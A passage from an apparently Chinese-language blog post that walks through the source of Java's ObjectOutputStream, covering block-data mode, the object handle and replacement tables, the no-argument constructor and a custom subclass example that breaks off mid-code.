*</span></span><br><span class="line"><span class="comment"> *     oos.writeInt(12345);</span></span><br><span class="line"><span class="comment"> *     oos.writeObject(&quot;Today&quot;);</span></span><br><span class="line"><span class="comment"> *     oos.writeObject(new Date());</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     oos.close();</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;在序列化/反序列化过程中需要特殊处理的类，必须**精确签名**地实现如下专有方法：</span></span><br><span class="line"><span class="comment"> * &lt;br&gt;</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * private void readObject(java.io.ObjectInputStream stream)</span></span><br><span class="line"><span class="comment"> *     throws IOException, ClassNotFoundException;</span></span><br><span class="line"><span class="comment"> * private void writeObject(java.io.ObjectOutputStream stream)</span></span><br><span class="line"><span class="comment"> *     throws IOException;</span></span><br><span class="line"><span class="comment"> * private void readObjectNoData()</span></span><br><span class="line"><span class="comment"> *     throws ObjectStreamException;</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&#123;<span class="doctag">@code</span> writeObject&#125; 方法负责写出该类自己那一部分的对象状态，</span></span><br><span class="line"><span class="comment"> * 以便对应的 &#123;<span class="doctag">@code</span> readObject&#125; 能正确恢复。</span></span><br><span class="line"><span class="comment"> * 它**无需关心**超类或子类的状态；通常通过在 &#123;<span class="doctag">@code</span> ObjectOutputStream&#125; 上</span></span><br><span class="line"><span class="comment"> * 逐个写出字段（可再次调用 &#123;<span class="doctag">@code</span> writeObject&#125;，或使用 DataOutput 支持的原始类型写法）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;未实现 &#123;<span class="doctag">@link</span> java.io.Serializable&#125; 的类，其字段**不会被写出**。</span></span><br><span class="line"><span class="comment"> * 但**不可序列化类的子类**仍然可以是可序列化的——此时，不可序列化的父类必须提供**无参构造器**</span></span><br><span class="line"><span class="comment"> * 以便在反序列化时初始化其字段；同时由**子类**负责保存/恢复该父类的必要状态</span></span><br><span class="line"><span class="comment"> * （常见做法是父类字段可访问，或提供 getter/setter 以便恢复）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;若希望**阻止**某对象被序列化，可在类中实现 &#123;<span class="doctag">@code</span> writeObject&#125;/&#123;<span class="doctag">@code</span> readObject&#125;</span></span><br><span class="line"><span class="comment"> * 并直接抛出 &#123;<span class="doctag">@link</span> java.io.NotSerializableException&#125;；该异常会被 ObjectOutputStream 捕获，</span></span><br><span class="line"><span class="comment"> * 并中止序列化流程。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;实现 &#123;<span class="doctag">@link</span> java.io.Externalizable&#125; 接口则让对象对其序列化格式与内容拥有**完全控制权**。</span></span><br><span class="line"><span class="comment"> * 框架会调用 &#123;<span class="doctag">@code</span> writeExternal&#125;/&#123;<span class="doctag">@code</span> readExternal&#125; 保存与恢复对象状态；</span></span><br><span class="line"><span class="comment"> * 类可以使用 &#123;<span class="doctag">@link</span> java.io.ObjectOutput&#125; / &#123;<span class="doctag">@link</span> java.io.ObjectInput&#125; 的所有方法</span></span><br><span class="line"><span class="comment"> * 自行读写。版本演进（versioning）也需要由对象自行处理。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;枚举常量（enum）的序列化与普通（可序列化/外部化）对象不同：</span></span><br><span class="line"><span class="comment"> * 序列化形式**只包含其名称**（&#123;<span class="doctag">@code</span> name()&#125; 的返回值），常量上的字段值不会被传输。</span></span><br><span class="line"><span class="comment"> * 与其他对象一样，枚举常量也可以作为后续回引用（back reference）的目标。</span></span><br><span class="line"><span class="comment"> * 枚举类型的序列化过程**不可自定义**：枚举类中定义的任何 &#123;<span class="doctag">@code</span> writeObject&#125;/&#123;<span class="doctag">@code</span> writeReplace&#125;</span></span><br><span class="line"><span class="comment"> * 都会在序列化时被忽略；同样，任何 &#123;<span class="doctag">@code</span> serialPersistentFields&#125; 或 &#123;<span class="doctag">@code</span> serialVersionUID&#125;</span></span><br><span class="line"><span class="comment"> * 声明也会被忽略——**所有枚举类型的 &#123;<span class="doctag">@code</span> serialVersionUID&#125; 固定为 0L**。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;除可序列化字段与 Externalizable 数据外，其余**原始数据**会以**块数据（block-data）记录**</span></span><br><span class="line"><span class="comment"> * 写入到 ObjectOutputStream 中。每个块数据记录由一个**头部**（标记 + 后续字节数）和数据体组成；</span></span><br><span class="line"><span class="comment"> * **连续的原始类型写入会被聚合**到同一块记录。块数据记录的默认**分块大小**为 1024 字节；</span></span><br><span class="line"><span class="comment"> * 每条记录会尽量填满至 1024 字节，或在“退出块数据模式”时被立刻写出。</span></span><br><span class="line"><span class="comment"> * 调用 &#123;<span class="doctag">@code</span> writeObject&#125;、&#123;<span class="doctag">@code</span> defaultWriteObject&#125; 与 &#123;<span class="doctag">@code</span> writeFields&#125;</span></span><br><span class="line"><span class="comment"> * 会**首先终止**（flush/切断）当前仍在聚合的块数据记录。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Mike Warres</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Roger Riggs</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.DataOutput</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.ObjectInputStream</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.Serializable</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.Externalizable</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> &lt;a href=&quot;../../../platform/serialization/spec/output.html&quot;&gt;</span></span><br><span class="line"><span class="comment"> *      Object Serialization Specification, Section 2, Object Output Classes&lt;/a&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectOutputStream</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">OutputStream</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">ObjectOutput</span>, ObjectStreamConstants &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="块输出流：BlockDataOutputStream-bout"><a href="#块输出流：BlockDataOutputStream-bout" class="headerlink" title="块输出流：BlockDataOutputStream bout"></a>块输出流：BlockDataOutputStream bout</h3><p><code>ObjectOutputStream</code>（OOS）并不直接往你提供的 <code>OutputStream out</code> 写字节，而是把它再包一层成 <strong><code>BlockDataOutputStream bout</code><strong>，所有写入</strong>最终</strong>都流经 <code>bout</code>。</p>
<p>你可以把它想成：<code>OOS</code> 管“组织与语法”（写什么标记、什么时候进入字段区），<code>bout</code> 管“物理出流”（是否包成块、如何加长度头、什么时候冲刷缓冲区）。</p>
<p><code>BlockDataOutputStream</code> 在数据写入时有两种模式：</p>
<ul>
<li><p><strong>结构化标记直写（非块模式）</strong>：<code>TC_OBJECT / TC_CLASSDESC / TC_REFERENCE / TC_NULL / TC_ENUM / TC_ARRAY / TC_STRING / TC_LONGSTRING / TC_ENDBLOCKDATA ...</code> 这些协议“标签”需要在<strong>非块模式</strong>下逐条写，保证接收端按标记边界解析。此时 <code>bout.writeByte(x)</code> 就是直接把 <code>x</code> 发到下游，不做块封装。</p>
</li>
<li><p><strong>原始字节聚合（块数据模式）</strong>：把原始类型（<code>byte</code>&#x2F;<code>int</code>&#x2F;<code>long</code>…）或一段“注解&#x2F;外部化数据”<strong>攒成一个块</strong>后一次性写出（<code>TC_BLOCKDATA</code> 或 <code>TC_BLOCKDATALONG</code> + 长度 + 内容），减少碎片化与边界处理的开销。</p>
</li>
</ul>
<p>两种模式是通过 <code>setBlockDataMode</code> 方法进行切换的：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">old</span> <span class="operator">=</span> bout.setBlockDataMode(newMode);</span><br></pre></td></tr></table></figure></div>

<p><code>setBlockDataMode</code> 函数实现如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将“块数据模式”设置为给定值（true=开，false=关），并**返回切换前的模式值**。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义说明：</span></span><br><span class="line"><span class="comment"> * - 若新旧模式相同：不做任何事，直接返回当前模式值（等于旧模式）。</span></span><br><span class="line"><span class="comment"> * - 若新旧模式不同：先把缓冲区中**尚未写出的字节**全部冲刷（drain），</span></span><br><span class="line"><span class="comment"> *   再切换模式；最后返回“旧模式值”，以便调用方在 finally 中恢复。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 典型用法：</span></span><br><span class="line"><span class="comment"> *   boolean old = bout.setBlockDataMode(true);</span></span><br><span class="line"><span class="comment"> *   try &#123;</span></span><br><span class="line"><span class="comment"> *       // 在块模式下写原始字节（字段、注解、external 数据等）</span></span><br><span class="line"><span class="comment"> *   &#125; finally &#123;</span></span><br><span class="line"><span class="comment"> *       bout.setBlockDataMode(old);   // 恢复进入前的模式</span></span><br><span class="line"><span class="comment"> *   &#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mode  目标模式（true=进入块模式；false=退出块模式）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>      切换**之前**的模式值（供调用方保存/恢复）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">setBlockDataMode</span><span class="params">(<span class="type">boolean</span> mode)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 若目标模式与当前模式一致：无须操作，直接返回当前（也即“旧的”）模式值</span></span><br><span class="line">    <span class="keyword">if</span> (blkmode == mode) &#123;</span><br><span class="line">        <span class="keyword">return</span> blkmode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模式发生切换前：必须将缓冲中的数据写出</span></span><br><span class="line">    <span class="comment">// 这样可以确保“块区内容”与“结构化标记”严格分段，不会黏连在一起导致读端误读</span></span><br><span class="line">    drain();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 真正切换到新模式</span></span><br><span class="line">    blkmode = mode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回“旧模式值”</span></span><br><span class="line">    <span class="comment">// 由于上面刚把 blkmode 设为了新的 mode，因此 !blkmode 等于“切换前的模式”</span></span><br><span class="line">    <span class="comment">// （如果你觉得易混淆，可以理解为：old = (blkmode 设新值前的值)）</span></span><br><span class="line">    <span class="keyword">return</span> !blkmode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将当前缓冲区（buf[0..pos)）中的**所有字节**写入到底层输出流 out，</span></span><br><span class="line"><span class="comment"> * 但**不**调用 out.flush()（不强制冲刷底层流）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 行为细节：</span></span><br><span class="line"><span class="comment"> * - 若 pos==0：缓冲为空，直接返回。</span></span><br><span class="line"><span class="comment"> * - 若当前处于“块模式”（blkmode==true）：</span></span><br><span class="line"><span class="comment"> *     * 先写入“块头”（TC_BLOCKDATA/TC_BLOCKDATALONG + 长度=pos），</span></span><br><span class="line"><span class="comment"> *       再把 buf 中的 pos 个字节写出；读端据此按长度精确读取该块。</span></span><br><span class="line"><span class="comment"> * - 若当前处于“非块模式”（blkmode==false）：</span></span><br><span class="line"><span class="comment"> *     * 直接把 buf 中的字节原样写出（非块模式下缓冲仅作聚合小写/减少 syscall）。</span></span><br><span class="line"><span class="comment"> * - 最后将 pos 置 0，表示缓冲已清空。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 典型调用时机：</span></span><br><span class="line"><span class="comment"> * - 模式切换前（setBlockDataMode 内部会先 drain 再切模式）。</span></span><br><span class="line"><span class="comment"> * - 内部缓冲写满时（上层写入导致 pos 达到阈值）。</span></span><br><span class="line"><span class="comment"> * - 某些显式 flush/收尾动作之前（但本方法本身不 flush 底层 out）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">drain</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (pos == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;                <span class="comment">// 无数据可写，直接返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (blkmode) &#123;</span><br><span class="line">        <span class="comment">// 在块模式下，必须先输出块头，告知读端本次紧随其后的块长度</span></span><br><span class="line">        writeBlockHeader(pos);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将缓冲内容写入底层输出流（不调用 out.flush()）</span></span><br><span class="line">    out.write(buf, <span class="number">0</span>, pos);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空缓冲计数</span></span><br><span class="line">    pos = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>从 true → false</strong>（离开块模式）：<br>先把<strong>缓冲里攒的块</strong>全部“<strong>冲刷成一个或多个 TC_BLOCKDATA&#x2F;TC_BLOCKDATALONG</strong>”发出去（这一步叫 drain&#x2F;flush），然后切到非块模式，接下来就可以安全地写结构化标记（比如 <code>TC_ENDBLOCKDATA</code>、<code>TC_OBJECT</code> 等）。</li>
<li><strong>从 false → true</strong>（进入块模式）：<br>简单地把模式置为“攒块”状态；接下来的原始字节会先进入缓冲，必要时再封成块吐出。</li>
</ul>
<p>OOS 会在<strong>不同语义段</strong>之间自动切换，常见场景：</p>
<ul>
<li><strong>写对象头&#x2F;类描述&#x2F;引用&#x2F;null</strong> → <strong>非块模式</strong><br>这些是<strong>结构化标记</strong>，不能包进块里。</li>
<li><strong>写默认字段（primitive 值）&#x2F;注解区&#x2F;Externalizable 数据</strong> → <strong>块模式</strong><br>这些是<strong>原始字节</strong>，攒成块更高效。</li>
<li><strong>在块模式里突然要写“对象引用类型字段”</strong>（比如字段是 <code>String</code> 或其他对象）：<br>OOS 会<strong>先把当前块 flush 出去</strong>（保持边界清晰），再临时切到<strong>非块模式</strong>写 <code>TC_STRING/TC_OBJECT/...</code> 等结构；写完又回到<strong>块模式</strong>继续攒后面的原始字节。</li>
</ul>
<h3 id="对象句柄表：HandleTable-handles"><a href="#对象句柄表：HandleTable-handles" class="headerlink" title="对象句柄表：HandleTable handles"></a>对象句柄表：HandleTable handles</h3><p>对象句柄表维护“<strong>对象实例 → 句柄ID</strong>（int，下标）”的映射，用于：</p>
<ul>
<li><strong>共享引用</strong>：同一对象实例在对象图里出现多次时，<strong>只首写一次</strong>，后续都用 <code>TC_REFERENCE</code> 回指，保持别名关系并节省体积。</li>
<li><strong>循环引用</strong>：对象自指或环状结构时，先登记一个“句柄”，再写其内部字段，避免无限递归。</li>
</ul>
<blockquote>
<p>句柄（handle）可以理解为“<strong>写端的对象编号</strong>”。写到线上的编号会再加一个固定偏移（<code>baseWireHandle=0x7E0000</code>）变成“<strong>线上句柄ID</strong>”。</p>
</blockquote>
<p>对象句柄表主要有下面两个相关函数：</p>
<ul>
<li><code>lookup(obj)</code>：找句柄ID；无则 <code>-1</code>。</li>
<li><code>assign(obj)</code>：为首次写出的对象分配句柄；</li>
</ul>
<p>一个对象是否可以被引用取决于 <code>unshared</code> 变量。<code>unshared</code> 来自于 <code>writeObject0</code> 的参数：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject0</span><span class="params">(Object obj, <span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException;</span><br></pre></td></tr></table></figure></div>

<p>具体来说是来自于 <code>writeUnshared(obj)</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeUnshared</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        writeObject0(obj, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">            writeFatalException(ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>意思是“本次写这个对象，不参与共享。以后就算再遇到<strong>同一个实例</strong>，也<strong>不要用 <code>TC_REFERENCE</code> 回指</strong>，而是<strong>当成新对象重写</strong>。”</p>
<p>序列化过程中会针对一个对象是否支持可引用（<code>unshared</code>）进行判断，例如：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handles.assign(unshared ? <span class="literal">null</span> : cl);</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (handle = handles.lookup(desc)) != -<span class="number">1</span>) &#123;</span><br><span class="line">    writeHandle(handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="对象替换表：ReplaceTable-subs"><a href="#对象替换表：ReplaceTable-subs" class="headerlink" title="对象替换表：ReplaceTable subs"></a>对象替换表：ReplaceTable subs</h3><p>序列化前，JDK 允许对象被“<strong>替换</strong>”成另外一个对象来写出，常见用途：</p>
<ul>
<li>**类私有 <code>writeReplace()</code>**：类作者用“序列化代理（serialization proxy）”维持不变量。<br>例：某些集合&#x2F;包装类把自己替换为更简单稳定的代理对象，避免把内部结构直接写出去。</li>
<li>**全局替换钩子 <code>replaceObject(obj)</code>**：只有 <strong>自定义 OOS 子类</strong> 显式 <code>enableReplaceObject(true)</code> 后才启用，可用于做统一的过滤、包装、脱敏等。</li>
</ul>
<p>在对象替换过程中，<code>ReplaceTable</code> 具体负责：</p>
<ul>
<li>保证<strong>替换稳定性与幂等</strong>：同一个“原对象（orig）”只要替换过一次，之后<strong>再遇到它</strong>，都应替换为<strong>同一个</strong>“替代对象（rep）”。<br>否则：第一次遇到 A → 替成 B；第二次遇到 A 又变成 C，就会破坏对象图一致性、干扰共享&#x2F;回指。</li>
<li>让“替换后的对象”参与后续的<strong>句柄共享</strong>与快速路径判断：把 A→B 的映射记录后，再次遇到 A，立即视为 B，因而可能直接命中 <code>handles</code>、写 <code>TC_REFERENCE</code>，或者走 <code>Class/OSC/String/...</code> 特例。</li>
</ul>
<h2 id="ObjectOutputStream-构造函数"><a href="#ObjectOutputStream-构造函数" class="headerlink" title="ObjectOutputStream 构造函数"></a>ObjectOutputStream 构造函数</h2><p>当我们实例化 <code>ObjectOutputStream</code> 并传入参数后，首先调用的是 <code>ObjectOutputStream</code> 的构造方法。</p>
<p><code>ObjectOutputStream</code> 构造方法有两个，一个是 <code>public</code> 的单参数构造函数，一个是 <code>protected</code> 的无参构造函数。</p>
<h3 id="无参构造函数"><a href="#无参构造函数" class="headerlink" title="无参构造函数"></a>无参构造函数</h3><p>无参构造函数定义如下，该函数主要用于当用户完全自定义实现 <code>ObjectOutputStream</code> 的子类时使用。此时由于不使用 JDK 默认实现的数据结构&#x2F;协议，因此构造函数中对 <code>ObjectOutputStream</code> 自身的数据结构不作初始化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 供**完全重实现**（re-implement）ObjectOutputStream 的子类使用的构造器。</span></span><br><span class="line"><span class="comment"> * 使用该构造器的子类可以**不分配**本实现所需的私有内部结构（如句柄表、替换表等），</span></span><br><span class="line"><span class="comment"> * 自行管理序列化格式与写出逻辑。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;安全管理器（SecurityManager）说明：</span></span><br><span class="line"><span class="comment"> * 若系统安装了 SecurityManager，本方法首先会调用</span></span><br><span class="line"><span class="comment"> * SecurityManager.checkPermission(new SerializablePermission(&quot;enableSubclassImplementation&quot;))</span></span><br><span class="line"><span class="comment"> * 以确保允许启用“子类自定义实现”能力；否则抛出 SecurityException。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;注意：使用该构造器意味着**不会自动写入流头部**，也不会初始化本类的内部状态；</span></span><br><span class="line"><span class="comment"> * 子类应自行决定何时/如何写入头部、如何组织块数据模式、如何管理句柄与替换等。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SecurityException 若安全管理器拒绝启用“子类自定义实现”</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException       创建流过程中发生的 I/O 错误（本实现中通常不会触发）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> SecurityManager#checkPermission</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.SerializablePermission</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">ObjectOutputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException, SecurityException &#123;</span><br><span class="line">    <span class="comment">// 若存在安全管理器，先校验是否具有“允许子类自定义实现”的权限。</span></span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">        sm.checkPermission(SUBCLASS_IMPLEMENTATION_PERMISSION);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用无参构造器时，不分配本实现的内部资源，统一置空；</span></span><br><span class="line">    <span class="comment">// 由子类自行负责序列化数据的组织与写出。</span></span><br><span class="line">    bout = <span class="literal">null</span>;      <span class="comment">// 不建立 BlockDataOutputStream 包装</span></span><br><span class="line">    handles = <span class="literal">null</span>;   <span class="comment">// 不建立句柄表</span></span><br><span class="line">    subs = <span class="literal">null</span>;      <span class="comment">// 不建立替换表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开启“子类接管”模式：表明当前实例由子类**完全重写**核心行为。</span></span><br><span class="line">    enableOverride = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调试栈同样不初始化，子类可按需提供自己的调试/诊断机制。</span></span><br><span class="line">    debugInfoStack = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外无参构造函数还会设置 <code>enableOverride = true</code>，这表示用户实现的子类完全接管 <code>ObjectOutputStream</code> 的 <code>writeObject</code> 函数，此时子类只需要实现 <code>writeObjectOverride</code> 函数，父类的 <code>writeObject</code> 函数会直接调用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">        writeObjectOverride(obj);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>例如下面这个实例，<code>SimpleObjectOutputStream</code> 完全接管父类的序列化行为，并且在 <code>writeObjectOverride</code> 函数中实现了自己的逻辑。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleObjectOutputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectOutputStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> OutputStream out;</span><br><span class="line"></span><br><span class="line">    SimpleObjectOutputStream(OutputStream out) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(); <span class="comment">// 关键：启用 enableOverride=true，不创建父类内部结构</span></span><br><span class="line">        <span class="built_in">this</span>.out = Objects.requireNonNull(out);</span><br><span class="line">        writeStreamHeader(); <span class="comment">// 自己决定何时写头</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeStreamHeader</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 自定义魔数 + 